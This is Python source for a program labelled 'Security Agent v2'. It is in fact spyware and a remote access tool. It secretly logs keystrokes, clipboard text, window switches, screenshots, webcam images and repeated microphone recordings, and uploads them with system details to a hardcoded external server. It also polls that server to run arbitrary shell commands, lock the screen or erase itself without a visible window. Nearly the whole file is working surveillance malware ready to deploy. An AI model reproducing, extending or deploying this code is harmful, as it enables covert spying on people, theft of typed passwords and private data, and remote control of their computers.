#!/usr/bin/env python3
"""
Security Agent v2 — Fixed with multi-device support
Captures: keystrokes, webcam, screenshots (on tab switch + periodic), 
          clipboard, audio (15 sec every 10), window switches
Controls: lock, reverse shell, self-destruct
All data tagged with unique DEVICE_ID — no more overwriting!
"""

import os
import sys
import json
import base64
import time
import threading
import subprocess
import socket
import platform
import hashlib
import uuid
from datetime import datetime
from urllib.request import Request, urlopen
from io import BytesIO

# ─── CONFIG ──────────────────────────────────────────────────
SERVER = "http://100.24.15.212:5000"        # ← Your EC2 IP
POLL_SEC = 3
WEBCAM_INTERVAL = 150      # 2.5 min
AUDIO_DURATION = 15        # 15 second audio clips
AUDIO_INTERVAL = 10        # Every 10 seconds
SCREENSHOT_INTERVAL = 20   # Periodic screenshot every 20s anyway

# ─── DEVICE ID (persistent, unique per machine) ──────────────
def get_device_id():
    """Generate a persistent unique hardware ID for this machine."""
    try:
        if sys.platform == 'win32':
            # Method 1: wmic csproduct get uuid
            try:
                out = subprocess.check_output(
                    'wmic csproduct get uuid', 
                    shell=True, 
                    stderr=subprocess.DEVNULL,
                    timeout=5
                ).decode('utf-8', errors='ignore')
                lines = out.strip().split('\n')
                if len(lines) >= 2:
                    uuid_val = lines[1].strip()
                    if uuid_val:
                        return hashlib.sha256(uuid_val.encode()).hexdigest()[:16]
            except:
                pass
            # Method 2: Windows MachineGUID from registry
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                     r"SOFTWARE\Microsoft\Cryptography")
                guid = winreg.QueryValueEx(key, "MachineGuid")[0]
                winreg.CloseKey(key)
                if guid:
                    return hashlib.sha256(guid.encode()).hexdigest()[:16]
            except:
                pass
        elif sys.platform == 'linux':
            for path in ['/etc/machine-id', '/var/lib/dbus/machine-id']:
                try:
                    with open(path) as f:
                        mid = f.read().strip()
                        if mid:
                            return hashlib.sha256(mid.encode()).hexdigest()[:16]
                except:
                    pass
        elif sys.platform == 'darwin':
            try:
                out = subprocess.check_output(
                    ['ioreg', '-d2', '-c', 'IOPlatformExpertDevice'],
                    stderr=subprocess.DEVNULL, timeout=5
                ).decode('utf-8', errors='ignore')
                for line in out.split('\n'):
                    if 'IOPlatformUUID' in line:
                        uid = line.split('"')[3]
                        return hashlib.sha256(uid.encode()).hexdigest()[:16]
            except:
                pass
    except:
        pass
    
    # Fallback: MAC address hash (works everywhere)
    return hashlib.sha256(hex(uuid.getnode()).encode()).hexdigest()[:16]

DEVICE_ID = get_device_id()

# ─── Try imports ────────────────────────────────────────────
# IMPORTANT: import pywintypes FIRST before win32 modules for PyInstaller compatibility
try:
    import pywintypes
except ImportError:
    pass

try:
    from pynput import keyboard
except ImportError:
    keyboard = None

try:
    import cv2
except ImportError:
    cv2 = None

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

try:
    import psutil
except ImportError:
    psutil = None

try:
    import pyaudio
    import wave
except ImportError:
    pyaudio = None
    wave = None

# win32 modules - import separately to handle gracefully
win32gui = None
win32clipboard = None
try:
    import win32gui
except ImportError:
    pass
try:
    import win32clipboard
except ImportError:
    pass

# ─── HELPERS ────────────────────────────────────────────────

def http_post(url, data, is_json=True, extra_headers=None):
    try:
        payload = json.dumps(data).encode() if is_json else (
            data.encode() if isinstance(data, str) else data)
        req = Request(url, data=payload, method='POST')
        req.add_header('Content-Type', 'application/json' if is_json else 'text/plain')
        req.add_header('X-Device-Id', DEVICE_ID)
        req.add_header('User-Agent', 'SecurityAgent/2.0')
        if extra_headers:
            for k, v in extra_headers.items():
                req.add_header(k, v)
        with urlopen(req, timeout=20) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        return None

def http_get(url, extra_headers=None):
    try:
        req = Request(url)
        req.add_header('X-Device-Id', DEVICE_ID)
        req.add_header('User-Agent', 'SecurityAgent/2.0')
        if extra_headers:
            for k, v in extra_headers.items():
                req.add_header(k, v)
        with urlopen(req, timeout=20) as r:
            return json.loads(r.read().decode())
    except:
        return None

def send_json(endpoint, data):
    return http_post(f"{SERVER}{endpoint}", data)

def send_text(endpoint, text):
    return http_post(f"{SERVER}{endpoint}", text, is_json=False)

# ─── SYSTEM INFO ───────────────────────────────────────────

def collect_info():
    info = {}
    try:
        info['device_id'] = DEVICE_ID
        info['hostname'] = socket.gethostname()
        info['os'] = platform.system()
        info['os_version'] = platform.version()
        info['os_release'] = platform.release()
        info['machine'] = platform.machine()
        info['user'] = os.environ.get('USER', os.environ.get('USERNAME', '?'))
        info['cpu'] = platform.processor()
        info['python'] = sys.version
        info['_timestamp'] = datetime.now().isoformat()
        
        # Local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('8.8.8.8', 1))
            info['ip'] = s.getsockname()[0]
        except:
            info['ip'] = '?'
        s.close()
        
        # MAC address
        try:
            if sys.platform == 'win32':
                try:
                    out = subprocess.check_output('getmac', shell=True, timeout=3,
                                                  stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
                    parts = out.strip().split('\n')
                    if len(parts) >= 2 and parts[1].strip():
                        info['mac'] = parts[1].strip().split()[0]
                    else:
                        info['mac'] = '?'
                except:
                    info['mac'] = '?'
            else:
                mac_hex = hex(uuid.getnode())[2:].zfill(12)
                info['mac'] = ':'.join(mac_hex[i:i+2] for i in range(0, 12, 2))
        except:
            info['mac'] = '?'
        
        # Public IP
        try:
            req = Request('https://api.ipify.org?format=json')
            with urlopen(req, timeout=5) as r:
                info['public_ip'] = json.loads(r.read()).get('ip', '?')
        except:
            info['public_ip'] = '?'
        
        # RAM / Disk / Processes
        if psutil:
            mem = psutil.virtual_memory()
            info['ram'] = f"{mem.total/1e9:.1f}GB ({mem.percent}% used)"
            try:
                disk_path = 'C:\\' if sys.platform == 'win32' else '/'
                info['disk'] = f"{psutil.disk_usage(disk_path).total/1e9:.1f}GB"
            except:
                pass
            info['processes'] = len(psutil.pids())
            info['boot_time'] = datetime.fromtimestamp(psutil.boot_time()).isoformat()
            
            try:
                conns = psutil.net_connections()
                info['connections'] = len(conns)
            except:
                pass
        
        # GPU
        if sys.platform == 'win32':
            try:
                out = subprocess.check_output(
                    'wmic path win32_VideoController get name',
                    shell=True, timeout=3, stderr=subprocess.DEVNULL
                ).decode('utf-8', errors='ignore')
                names = [l.strip() for l in out.split('\n')[1:] if l.strip()]
                if names:
                    info['gpu'] = names[0]
            except:
                pass
        
        # Uptime
        if psutil:
            uptime_sec = time.time() - psutil.boot_time()
            days = int(uptime_sec // 86400)
            hours = int((uptime_sec % 86400) // 3600)
            mins = int((uptime_sec % 3600) // 60)
            info['uptime'] = f"{days}d {hours}h {mins}m"
        
        # Top processes
        if psutil:
            procs = []
            for p in sorted(psutil.process_iter(['name', 'cpu_percent', 'memory_percent']),
                           key=lambda p: p.info.get('cpu_percent', 0) or 0, reverse=True)[:10]:
                try:
                    procs.append(f"{p.info['name']} CPU:{p.info['cpu_percent']}%")
                except:
                    pass
            info['top_processes'] = procs
        
        # Running services count
        try:
            if sys.platform == 'win32':
                out = subprocess.check_output(
                    'sc query type=service state=running',
                    shell=True, timeout=5, stderr=subprocess.DEVNULL
                ).decode('utf-8', errors='ignore')
                info['running_services'] = out.count('SERVICE_NAME')
        except:
            pass
        
    except Exception as e:
        info['collect_error'] = str(e)
    
    return info

# ─── WEBCAM ─────────────────────────────────────────────────

def capture_webcam():
    if not cv2:
        return None
    try:
        # Try CAP_DSHOW for Windows (faster), fallback to default
        try:
            cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            if not cam.isOpened():
                cam.release()
                cam = cv2.VideoCapture(0)
        except:
            cam = cv2.VideoCapture(0)
        
        if not cam.isOpened():
            return None
        
        # Warm up the camera - read a few frames
        for _ in range(5):
            ret, frame = cam.read()
            if ret:
                break
        
        if not ret or frame is None:
            cam.release()
            return None
        
        cam.release()
        _, buf = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 75])
        return base64.b64encode(buf).decode()
    except Exception as e:
        return None

# ─── SCREENSHOT ────────────────────────────────────────────

def take_screenshot():
    try:
        if ImageGrab:
            ss = ImageGrab.grab()
            buf = BytesIO()
            
            # Compress to stay under reasonable size
            quality = 70
            ss.save(buf, format='JPEG', quality=quality)
            size = buf.tell()
            
            # If too big, lower quality progressively
            while size > 5_000_000 and quality > 20:
                buf = BytesIO()
                quality -= 10
                ss.save(buf, format='JPEG', quality=quality)
                size = buf.tell()
            
            buf.seek(0)
            return base64.b64encode(buf.read()).decode()
    except Exception as e:
        pass
    return None

# ─── CLIPBOARD ─────────────────────────────────────────────

_last_clip = ""

def get_clipboard():
    global _last_clip
    try:
        if sys.platform == 'win32' and win32clipboard:
            try:
                import pywintypes  # Need this for PyInstaller
            except:
                pass
            try:
                win32clipboard.OpenClipboard()
                try:
                    clip_data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                    return clip_data.strip() if clip_data else ""
                except:
                    pass
                finally:
                    try:
                        win32clipboard.CloseClipboard()
                    except:
                        pass
            except:
                pass
        elif sys.platform == 'linux':
            for cmd in [['xclip', '-o', '-selection', 'clipboard'], ['xsel', '-b', '-o']]:
                try:
                    out = subprocess.check_output(cmd, timeout=2, stderr=subprocess.DEVNULL).decode(errors='replace').strip()
                    return out
                except:
                    pass
        elif sys.platform == 'darwin':
            try:
                out = subprocess.check_output(['pbpaste'], timeout=2, stderr=subprocess.DEVNULL).decode(errors='replace').strip()
                return out
            except:
                pass
    except:
        pass
    return ""

# ─── ACTIVE WINDOW ─────────────────────────────────────────

_prev_window_title = ""

def get_active_window():
    global _prev_window_title
    try:
        if sys.platform == 'win32' and win32gui:
            hwnd = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(hwnd)
            if title:
                _prev_window_title = title
            return title
        elif sys.platform == 'linux':
            for cmd in [
                ['xdotool', 'getactivewindow', 'getwindowname'],
                ['xprop', '-id', subprocess.check_output(['xdotool', 'getactivewindow'], timeout=2).strip(), 'WM_NAME']
            ]:
                try:
                    out = subprocess.check_output(cmd, timeout=2, stderr=subprocess.DEVNULL).decode(errors='replace').strip()
                    if out:
                        _prev_window_title = out
                        return out
                except:
                    pass
    except:
        pass
    return _prev_window_title or "?"

# ─── LOCK ──────────────────────────────────────────────────

def lock_workstation():
    try:
        if sys.platform == 'win32':
            import ctypes
            ctypes.windll.user32.LockWorkStation()
            return True
        elif sys.platform == 'linux':
            for cmd in [
                ['gnome-screensaver-command', '-l'],
                ['xdg-screensaver', 'lock'],
                ['loginctl', 'lock-session']
            ]:
                try:
                    subprocess.Popen(cmd, stderr=subprocess.DEVNULL)
                    return True
                except:
                    pass
    except:
        pass
    return False

# ─── SHELL ─────────────────────────────────────────────────

def execute_shell(cmd):
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, 
            text=True, timeout=30
        )
        out = r.stdout or ""
        if r.stderr:
            err = r.stderr.strip()
            if err:
                out += f"\n[STDERR]\n{err[:2000]}"
        return out[:15000]
    except subprocess.TimeoutExpired:
        return "[TIMEOUT - Command took >30s]"
    except Exception as e:
        return f"[ERROR] {e}"

# ─── AUDIO ─────────────────────────────────────────────────

def capture_audio(duration=15):
    """Record audio for `duration` seconds, return base64 WAV."""
    if not pyaudio or not wave:
        return None
    p = None
    stream = None
    try:
        p = pyaudio.PyAudio()
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 16000
        CHUNK = 1024
        
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE,
                       input=True, frames_per_buffer=CHUNK)
        
        frames = []
        total_chunks = int(RATE / CHUNK * duration)
        
        for _ in range(total_chunks):
            try:
                data = stream.read(CHUNK, exception_on_overflow=False)
                frames.append(data)
            except:
                break
        
        if stream:
            stream.stop_stream()
            stream.close()
            stream = None
        
        p.terminate()
        p = None
        
        if not frames:
            return None
        
        buf = BytesIO()
        wf = wave.open(buf, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(2)  # paInt16 = 2 bytes
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        buf.seek(0)
        return base64.b64encode(buf.read()).decode()
    except Exception as e:
        return None
    finally:
        if stream:
            try:
                stream.stop_stream()
                stream.close()
            except:
                pass
        if p:
            try:
                p.terminate()
            except:
                pass

# ─── KEYBOARD LISTENER ─────────────────────────────────────

class KeyLoggerThread(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.buffer = []
        self.buf_lock = threading.Lock()
    
    def run(self):
        if not keyboard:
            return
        
        def on_press(key):
            with self.buf_lock:
                try:
                    char = key.char if (hasattr(key, 'char') and key.char) else f'[{key.name}]'
                except:
                    try:
                        char = f'[{key}]'
                    except:
                        char = '[?]'
                self.buffer.append(char)
                if len(self.buffer) >= 300:
                    self.flush()
        
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    
    def flush(self):
        with self.buf_lock:
            if not self.buffer:
                return ""
            text = ''.join(self.buffer)
            self.buffer = []
        
        if text and text.strip():
            send_text("/api/keystrokes", text)
        return text
    
    def get_and_clear(self):
        with self.buf_lock:
            text = ''.join(self.buffer)
            self.buffer = []
        return text

# ─── SELF DESTRUCT ─────────────────────────────────────────

def self_destruct():
    """Remove the agent from the system."""
    try:
        script_path = os.path.abspath(__file__)
        
        if sys.platform == 'win32':
            bat = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'cleanup.bat')
            with open(bat, 'w') as f:
                f.write(f'''@echo off
timeout /t 2 /nobreak >nul
del /f /q "{script_path}" >nul 2>&1
del /f /q "%~f0" >nul 2>&1
''')
            subprocess.Popen(
                ['cmd.exe', '/c', bat], 
                shell=True, 
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:
            try:
                os.remove(script_path)
            except:
                pass
        
        sys.exit(0)
    except Exception as e:
        sys.exit(0)

# ─── MAIN LOOP ─────────────────────────────────────────────

def main():
    print(f"[*] Security Agent v2 starting...")
    print(f"[*] Server: {SERVER}")
    print(f"[*] Device ID: {DEVICE_ID}")
    print(f"[*] Hostname: {socket.gethostname()}")
    
    # Start keylogger thread
    keylogger = KeyLoggerThread()
    keylogger.start()
    
    # ─── Initial data burst ───
    
    # System info
    info = collect_info()
    send_json("/api/info", info)
    print(f"[+] System info sent | Device: {DEVICE_ID}")
    
    # Initial webcam
    wc = capture_webcam()
    if wc:
        send_json("/api/webcam", {"image": wc, "device_id": DEVICE_ID})
        print("[+] Initial webcam capture sent")
    
    # Initial screenshot
    ss = take_screenshot()
    if ss:
        send_json("/api/screenshot", {"image": ss, "device_id": DEVICE_ID})
        print("[+] Initial screenshot sent")
    
    # Initial clipboard
    clip = get_clipboard()
    if clip:
        send_json("/api/clipboard", {"text": clip[:500], "device_id": DEVICE_ID})
    
    # ─── State ───
    global _last_clip, _prev_window_title
    _last_clip = clip or ""
    _prev_window_title = get_active_window()
    
    last_webcam_time = time.time()
    last_audio_time = time.time() - 5  # Stagger from webcam
    last_ss_time = time.time()
    last_info_time = time.time()
    
    cycle_count = 0
    
    # ─── Main loop ───
    while True:
        try:
            now = time.time()
            cycle_count += 1
            
            # ─────── 1. Poll for commands ───────
            cmds = http_get(f"{SERVER}/api/poll?device_id={DEVICE_ID}")
            
            if cmds:
                # Remote lock
                if cmds.get("lock"):
                    print("[!] Remote lock command received!")
                    lock_workstation()
                
                # Take screenshot on demand (triggered by screen switch)
                if cmds.get("take_screenshot"):
                    print("[!] Taking screenshot (screen switch detected)")
                    ss = take_screenshot()
                    if ss:
                        send_json("/api/screenshot", {"image": ss, "device_id": DEVICE_ID})
                
                # Shell command
                shell_cmd = cmds.get("shell_command", "")
                if shell_cmd:
                    print(f"[!] Executing shell command: {shell_cmd}")
                    output = execute_shell(shell_cmd)
                    send_json("/api/shell_response", {
                        "output": output,
                        "device_id": DEVICE_ID
                    })
                    print(f"[+] Shell output sent ({len(output)} chars)")
                
                # Self destruct
                if cmds.get("self_destruct"):
                    print("[!] Self-destruct triggered!")
                    send_text("/api/keystrokes", "[AGENT SELF-DESTRUCTED]\n")
                    time.sleep(1)
                    self_destruct()
            
            # ─────── 2. Webcam every 2.5 min ───────
            if now - last_webcam_time > WEBCAM_INTERVAL:
                wc = capture_webcam()
                if wc:
                    send_json("/api/webcam", {"image": wc, "device_id": DEVICE_ID})
                    print(f"[+] Webcam sent ({datetime.now().strftime('%H:%M:%S')})")
                last_webcam_time = now
            
            # ─────── 3. Audio: 15 seconds, every 10 seconds ───────
            if now - last_audio_time >= AUDIO_INTERVAL:
                print(f"[*] Recording audio ({AUDIO_DURATION}s)...")
                audio_data = capture_audio(AUDIO_DURATION)
                if audio_data:
                    send_json("/api/audio", {
                        "audio": audio_data,
                        "device_id": DEVICE_ID,
                        "duration": AUDIO_DURATION
                    })
                    print(f"[+] Audio clip sent ({datetime.now().strftime('%H:%M:%S')})")
                last_audio_time = now
            
            # ─────── 4. Screen switch detection ───────
            current_window = get_active_window()
            if current_window and _prev_window_title and current_window != _prev_window_title:
                print(f"[!] Window switched: \"{_prev_window_title[:40]}\" -> \"{current_window[:40]}\"")
                
                # Report the switch to server
                send_json("/api/screen_switch", {
                    "from": _prev_window_title,
                    "to": current_window,
                    "time": datetime.now().isoformat(),
                    "device_id": DEVICE_ID
                })
                
                # Take screenshot immediately on window switch
                ss = take_screenshot()
                if ss:
                    send_json("/api/screenshot", {"image": ss, "device_id": DEVICE_ID})
                    print("[+] Screenshot on window switch")
            
            _prev_window_title = current_window or _prev_window_title
            
            # ─────── 5. Clipboard monitoring ───────
            clip = get_clipboard()
            if clip and clip != _last_clip and len(clip) > 2:
                send_json("/api/clipboard", {
                    "text": clip[:500],
                    "time": datetime.now().isoformat(),
                    "device_id": DEVICE_ID
                })
                print(f"[+] Clipboard: {clip[:40]}...")
                _last_clip = clip
            
            # ─────── 6. Flush keystroke buffer ───────
            keylogger.flush()
            
            # ─────── 7. Periodic screenshot ───────
            if now - last_ss_time > SCREENSHOT_INTERVAL:
                ss = take_screenshot()
                if ss:
                    send_json("/api/screenshot", {"image": ss, "device_id": DEVICE_ID})
                last_ss_time = now
            
            # ─────── 8. Periodic info refresh (every 5 min) ───────
            if now - last_info_time > 300:
                info = collect_info()
                send_json("/api/info", info)
                last_info_time = now
            
        except Exception as e:
            pass
        
        time.sleep(POLL_SEC)


if __name__ == '__main__':
    main()